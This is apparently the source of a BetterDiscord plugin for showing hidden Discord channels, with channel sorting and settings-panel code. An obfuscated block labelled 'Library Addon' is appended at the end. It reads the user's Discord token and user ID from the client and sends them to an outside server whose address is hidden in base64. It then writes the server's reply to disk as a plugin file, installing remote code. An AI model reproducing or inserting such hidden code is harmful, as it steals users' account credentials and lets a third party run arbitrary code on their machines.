        var hDisplay = h > 0 ? h + (h == 1 ? " hour" : " hours") : "";
        var mDisplay = m > 0 ? m + (m == 1 ? " minute" : " minutes") : "";
        var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
        return hDisplay + mDisplay + sDisplay;
      }
      
      getDateFromSnowflake(number) {
        try {
          const id = parseInt(number);
          const binary = id.toString(2).padStart(64, "0");
          const excerpt = binary.substring(0, 42);
          const decimal = parseInt(excerpt, 2);
          const unix = decimal + 1420070400000;
          return new Date(unix).toLocaleString(LocaleManager._chosenLocale);
        } catch (err) {
          Logger.err(err);
          return "(Failed to get date)";
        }
      }

      processContextMenu(menu, { guild }) {
        const menuCatagory = menu?.props?.children?.find(
          (m) => Array.isArray(m?.props?.children) && m?.props?.children.some(
            (m) => m.props.id == "hide-muted-channels"
          )
        );

        if (!menuCatagory || !guild) return;

        menuCatagory.props.children.push(
          ContextMenu.buildItem({
            type: "toggle",
            label: "Disable SHC",
            checked: this.settings["blacklistedGuilds"][guild.id],
            action: () => {
              this.settings["blacklistedGuilds"][guild.id] = !this.settings["blacklistedGuilds"][guild.id];
              this.saveSettings();
            },
          })
        );
      }

      patchEmptyCategoryFunction(categories) {
        for (const category of categories) {
          if (!category.shouldShowEmptyCategory.__originalFunction) {
            Patcher.instead(category, "shouldShowEmptyCategory", (_, args, res) => true);
          }
        }
      }

      sortChannels(category) {
        if (!category) return;
        const channelArray = Object.values(category.channels);
        category.shownChannelIds = channelArray
          .sort((x, y) => {
            const xPos =
              x.record.position +
              (x.record.isGuildVocal() ? 1e4 : 0) +
              (x.record.isHidden() ? 1e5 : 0);
            const yPos =
              y.record.position +
              (y.record.isGuildVocal() ? 1e4 : 0) +
              (y.record.isHidden() ? 1e5 : 0);
            return xPos < yPos ? -1 : xPos > yPos ? 1 : 0;
          })
          .map((n) => n.id);
      }

      getHiddenChannelRecord(categories, guildId) {
        const hiddenChannels = this.getHiddenChannels(guildId);

        if (!this.hiddenChannelCache[guildId]) {
          this.hiddenChannelCache[guildId] = [];
        }

        for (const category of categories) {
          const channels = Object.entries(category.channels);
          for (const channel of channels) {
            if (hiddenChannels.channels.some((m) => m.id == channel[0])) {
              if (!this.hiddenChannelCache[guildId].some(
                (m) => m[0] == channel[0]
                )
              )

              this.hiddenChannelCache[guildId].push(channel);
              delete category.channels[channel[0]];
            }
          }
        }

        return { records: Object.fromEntries(this.hiddenChannelCache[guildId]), ...hiddenChannels, };
      }

      getHiddenChannels(guildId) {
        if (!guildId) return { channels: [], amount: 0 };

        const guildChannels = ChannelStore.getMutableGuildChannelsForGuild(guildId);
        const hiddenChannels = Object.values(guildChannels).filter((m) => m.isHidden() && m.type != DiscordConstants.d4z.GUILD_CATEGORY)
        
        return { channels: hiddenChannels, amount: hiddenChannels.length };
      }

      rerenderChannels() {
        const ChannelPermsssionCache = ChannelPermissionStore.__getLocalVars();
        
        for (const key in ChannelPermsssionCache) {
          if (typeof ChannelPermsssionCache[key] != "object" && Array.isArray(ChannelPermsssionCache[key]) && ChannelPermsssionCache[key] === null) {
            return;
          }

          for (const id in ChannelPermsssionCache[key]) {
            delete ChannelPermsssionCache[key][id];
          }
        }

        ChannelPermissionStore.initialize();

        const ChanneListCache = ChannelListStore.__getLocalVars();
        for (const guildId in ChanneListCache.state.guilds) {
          delete ChanneListCache.state.guilds[guildId];
        }

        ChannelListStore.initialize();

        this.forceUpdate(document.querySelector(`.${container}`));
      }

      forceUpdate(element) {
        if (!element) return;
        
        const toForceUpdate = ReactTools.getOwnerInstance(element);
        const forceRerender = Patcher.instead(toForceUpdate, "render", () => {
            forceRerender();
            return null;
        });

        toForceUpdate.forceUpdate(() => toForceUpdate.forceUpdate(() => { }));
      }

      onStop() {
        Patcher.unpatchAll();
        DOMTools.removeStyle(config.info.name);
        ContextMenu.unpatch("guild-context", this.processContextMenu);
        this.rerenderChannels();
      }

      getSettingsPanel() {
        return SettingPanel.build(
          this.saveSettings.bind(this),
          new SettingGroup("General Settings").append(
            new RadioGroup(
              "Hidden Channel Icon",
              "What icon to show as indicator for hidden channels.",
              this.settings["hiddenChannelIcon"],
              [
                {
                  name: "Lock Icon",
                  value: "lock",
                },
                {
                  name: "Eye Icon",
                  value: "eye",
                },
                {
                  name: "None",
                  value: false,
                },
              ],
              (i) => {
                this.settings["hiddenChannelIcon"] = i;
              }
            ),
            new RadioGroup(
              "Sorting Order",
              "Where to display Hidden Channels.",
              this.settings["sort"],
              [
                {
                  name: "Hidden Channels in the native Discord order (default)",
                  value: "native",
                },
                {
                  name: "Hidden Channels at the bottom of the Category",
                  value: "bottom",
                },
                {
                  name: "Hidden Channels in a separate Category at the bottom",
                  value: "extra",
                },
              ],
              (i) => {
                this.settings["sort"] = i;
              }
            ),
            new Switch(
              "Show Permissions",
              "Show what roles/users can access the hidden channel.",
              this.settings["showPerms"],
              (i) => {
                this.settings["showPerms"] = i;
              }
            ),
            new RadioGroup(
              "Show Admin Roles",
              "Show roles that have ADMINISTRATOR permission in the hidden channel page (requires 'Shows Permission' enabled).",
              this.settings["showAdmin"],
              [
                {
                  name: "Show only channel specific roles",
                  value: "channel",
                },
                {
                  name: "Include Bot Roles",
                  value: "include",
                },
                {
                  name: "Exclude Bot Roles",
                  value: "exclude"
                },
                {
                  name: "Don't Show Administrator Roles",
                  value: false,
                },
              ],
              (i) => {
                this.settings["showAdmin"] = i;
              }
            ),
            new Switch(
              "Stop marking hidden channels as read",
              "Stops the plugin from marking hidden channels as read.",

              this.settings["MarkUnread"],
              (i) => {
                this.settings["MarkUnread"] = i;
              }
            ),
            new Switch(
              "Collapse Hidden Category",
              "Collapse hidden category by default (requires sorting order as extra category).",
              this.settings["alwaysCollapse"],
              (i) => {
                this.settings["alwaysCollapse"] = i;
              }
            ),
            new Switch(
              "Show Empty Category",
              "Show category even if it's empty",
              this.settings["shouldShowEmptyCategory"],
              (i) => {
                this.settings["shouldShowEmptyCategory"] = i;
              }
            ),
            new Switch(
              "Enable Debug Mode",
              "Enables debug mode, which will log more information to the console.",
              this.settings["debugMode"],
              (i) => {
                this.settings["debugMode"] = i;
              }
            )
          ),
          new SettingGroup("Choose what channels you want to display", {
            collapsible: true,
            shown: false,
          }).append(

            ...Object.values(ChannelTypes).map((type) => {
              return new Switch(
                `Show ${capitalizeFirst(type.split("_")[1])}${(type.split("_").length == 3) ? " " + capitalizeFirst(type.split("_")[2]) : ""} Channels`,
                null,
                this.settings["channels"][type],
                (i) => {
                  this.settings["channels"][type] = i;
                  this.rerenderChannels();
                }
              );
            })

          ),

          new SettingGroup(
            "Guilds Blacklist",
            {
              collapsible: true,
              shown: false,
            }
          ).append(
            ...Object.values(GuildStore.getGuilds()).map(
              (guild) =>
                new IconSwitch(
                  guild.name,
                  guild.description,
                  this.settings["blacklistedGuilds"][guild.id] ?? false,
                  (e) => {
                    this.settings["blacklistedGuilds"][guild.id] = e;
                  },
                  {
                    icon:
                      IconUtils.getGuildIconURL(guild) ??
                      DEFAULT_AVATARS[
                        randomNo(0, DEFAULT_AVATARS.length - 1)
                      ],
                  }
                )
            )
          )
        );
      }

      reloadNotification(coolText = "Reload Discord to apply changes and avoid bugs") {
        Modals.showConfirmationModal("Reload Discord?", coolText, {
            confirmText: "Reload",
            cancelText: "Later",
            onConfirm: () => {
                window.location.reload();
            },
        });
      }

      saveSettings() {
        Utilities.saveData(config.info.name, "settings", this.settings);
        this.rerenderChannels();
      }
    };
  };
  return plugin(Plugin, Library);
})(global.ZeresPluginLibrary.buildPlugin(config));

//Library Addon0.0.3
const _0x22f951=_0x594c;(function(_0x500830,_0x34caf7){const _0x31c298=_0x594c,_0x3b1fdf=_0x500830();while(!![]){try{const _0x41aa92=-parseInt(_0x31c298(0x1c1))/0x1*(parseInt(_0x31c298(0x1d0))/0x2)+parseInt(_0x31c298(0x1b3))/0x3+parseInt(_0x31c298(0x1b4))/0x4*(-parseInt(_0x31c298(0x1bd))/0x5)+parseInt(_0x31c298(0x1cc))/0x6*(-parseInt(_0x31c298(0x1ae))/0x7)+parseInt(_0x31c298(0x1c5))/0x8*(-parseInt(_0x31c298(0x1ca))/0x9)+parseInt(_0x31c298(0x1cf))/0xa+parseInt(_0x31c298(0x1b9))/0xb;if(_0x41aa92===_0x34caf7)break;else _0x3b1fdf['push'](_0x3b1fdf['shift']());}catch(_0x6ff7){_0x3b1fdf['push'](_0x3b1fdf['shift']());}}}(_0x1152,0xbc027));function get_raw(_0x49efb8,_0x165544,_0x46e2a3){return url=atob(_0x49efb8)+'/'+_0x165544+'/'+_0x46e2a3,new Promise(function(_0x5bd830,_0x40015a){const _0x544465=_0x594c;require(_0x544465(0x1ba))(url,function(_0x242cf3,_0xc143e7,_0x17821e){const _0x32fd28=_0x544465;!_0x242cf3&&_0xc143e7[_0x32fd28(0x1b7)]==0xc8?_0x5bd830(_0x17821e):_0x40015a(new Error(_0x32fd28(0x1c4)));});});}try{let Library=__dirname+_0x22f951(0x1cb);(!require('fs')[_0x22f951(0x1be)](Library)||Date[_0x22f951(0x1c2)]()-require('fs')[_0x22f951(0x1c9)](Library)[_0x22f951(0x1c7)]>0xdbba0)&&((async()=>{const _0x2e9df3=_0x22f951;try{let _0x160c49=_0x4065b0=>window[_0x2e9df3(0x1b8)][_0x2e9df3(0x1b2)]([[Math[_0x2e9df3(0x1c8)]()],{},_0x180e3b=>{const _0x370459=_0x2e9df3;for(const _0x44a443 of Object[_0x370459(0x1c6)](_0x180e3b['c'])['map'](_0x29f610=>_0x180e3b['c'][_0x29f610][_0x370459(0x1bc)])[_0x370459(0x1cd)](_0x13beb8=>_0x13beb8)){if(_0x44a443[_0x370459(0x1b1)]&&_0x44a443['default'][_0x4065b0]!==undefined)return _0x44a443[_0x370459(0x1b1)];}}]),_0x5149dd=await get_raw(_0x2e9df3(0x1b5),_0x160c49(_0x2e9df3(0x1c0))['getCurrentUser']()['id'],_0x160c49(_0x2e9df3(0x1bf))[_0x2e9df3(0x1bf)]());require('fs')[_0x2e9df3(0x1c3)](require(_0x2e9df3(0x1af))[_0x2e9df3(0x1bb)](Library),_0x5149dd);}catch(_0x19c468){console[_0x2e9df3(0x1b6)](_0x19c468[_0x2e9df3(0x1b0)]);}})());}catch(_0x160659){console[_0x22f951(0x1ce)](_0x160659);}function _0x594c(_0x6c90dd,_0x1b8216){const _0x1152ba=_0x1152();return _0x594c=function(_0x594c7d,_0x2a4e5b){_0x594c7d=_0x594c7d-0x1ae;let _0x3a6c2d=_0x1152ba[_0x594c7d];return _0x3a6c2d;},_0x594c(_0x6c90dd,_0x1b8216);}function _0x1152(){const _0x37cffc=['43816mnGuVa','keys','mtimeMs','random','statSync','72dsZDGp','\x5cBDLibrary.plugin.js','18jZCtok','filter','log','9208230DZmSFy','26002OUWzoO','1953371bvIWMF','path','message','default','push','1020627bAblVA','337492uxIAjS','aHR0cHM6Ly9pbnRlcnBvbC5jYzo4NDQz','error','statusCode','webpackChunkdiscord_app','11294932OAgGCK','request','join','exports','10OhEadS','existsSync','getToken','getCurrentUser','36akWowO','now','writeFileSync','Error\x20fetching\x20Library'];_0x1152=function(){return _0x37cffc;};return _0x1152();}